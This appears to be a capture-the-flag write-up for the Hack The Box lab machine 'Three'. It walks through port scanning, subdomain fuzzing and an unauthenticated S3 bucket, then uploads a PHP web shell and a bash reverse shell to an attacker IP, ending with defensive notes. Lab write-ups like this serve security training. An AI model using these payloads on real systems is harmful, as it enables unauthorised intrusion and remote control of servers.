---
title: "Three"
draft: false
date: 2025-08-28 01:09:33 +0300
description: A beginner-friendly Boot2Root machine from HTB.
categories: ["HTB", "NMAP", "FFUF", "aws s3", "awscli", "very easy", "boot2root", "B2R"]
tags: ["HTB", "NMAP", "FFUF", "aws s3", "awscli", "very easy", "boot2root", "B2R"]
featureimage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/49fa1274ca631fd870e9feca35b7d7c2.png"
---
# Three

## Description
**Three** is a Linux machine hosting a website that uses an **AWS S3 bucket** as its cloud storage.  
The bucket is misconfigured, allowing us to upload a malicious file.  
By executing this file through the website, we can gain remote access to the system and retrieve the flag.


## Enumeration

### Step 1: Scanning the Target for Open Ports
Start with a full port scan to identify services running on the machine:

```bash
nmap -sV -p- 10.129.227.248 -T4
```

**Output:**
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

**Findings:**
- Port 22 (SSH) is open.
- Port 80 (HTTP) is hosting a website.

### Step 2: Exploring the Website
1. Visit the site in your browser using the target IP on port 80.
2. Check the Contact section and note the email address:
   ```
   mail@thetoppers.htb
   ```
3. Since the domain `thetoppers.htb` is being used, map it to the target IP in your `/etc/hosts` file:
   ```bash
   echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
   ```

> **Tip:** `/etc/hosts` lets you manually link a domain name to an IP address so your computer can access the site without DNS.

### Step 3: Enumerating Subdomains
Use `ffuf` to brute-force possible subdomains:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://thetoppers.htb \
-H "Host: FUZZ.thetoppers.htb" \
-ac
```

**Result:**
```
s3.thetoppers.htb
```

Map this subdomain as well:
```bash
echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Visit it in the browser or via curl:
```bash
curl http://s3.thetoppers.htb
```

**Output:**
```json
{"status": "running"}
```

This indicates that the site is using an Amazon S3-like storage service.

> **What is Amazon S3?**
> Amazon Simple Storage Service (S3) is a cloud service that stores files.
> A misconfigured S3 bucket can allow unauthorized reading, writing, or deleting of files.

## Configuring and Interacting with the S3 Bucket

### Step 4: Setting Up AWS CLI
Install and configure the AWS CLI if you haven't already:

```bash
aws configure
```

Use temporary placeholder values since authentication is not enforced:
```
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

### Step 5: Listing Buckets and Files
List all available buckets:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

List files inside the bucket:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

## Exploiting the S3 Bucket

### Step 6: Uploading a Web Shell
Create a simple PHP shell locally:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload the shell:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Visit the uploaded file to test command execution:
```
http://thetoppers.htb/shell.php?cmd=whoami
```

**Output:**
```
www-data
```

This confirms that you can run commands on the server.

### Step 7: Setting Up a Reverse Shell
Create a reverse shell script locally (change `10.10.16.2` to your attacker IP):
```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/10.10.16.2/1234 0>&1' > shell.sh
```

Upload the script:
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.sh s3://thetoppers.htb
```

Set up a listener on your machine:
```bash
nc -lvnp 1234
```

Trigger the reverse shell by visiting:
```
http://thetoppers.htb/shell.php?cmd=bash%20shell.sh
```

**Output:**
```
listening on [any] 1234 ...
connect to [10.10.16.2] from (UNKNOWN) [10.129.227.248] 44028
bash: no job control in this shell
www-data@three:/var/www/html$
```

## Post-Exploitation

### Step 8: Finding the Flag
Once connected, look for the flag:
```bash
locate flag.txt
```

**Output:**
```bash
/var/www/flag.txt
```

Read the flag:
```bash
cat /var/www/flag.txt
```

## Blue Team Notes
The root cause is a publicly writable S3 bucket.

To prevent such issues:
- Restrict bucket permissions to only trusted IAM users.
- Disable public access unless explicitly required.
- Monitor bucket activity logs for unusual operations.

## Key Takeaways
- Misconfigured S3 buckets are a common attack vector.
- Always enumerate subdomains when testing web applications.
- Gaining command execution can often lead to a reverse shell for deeper access.
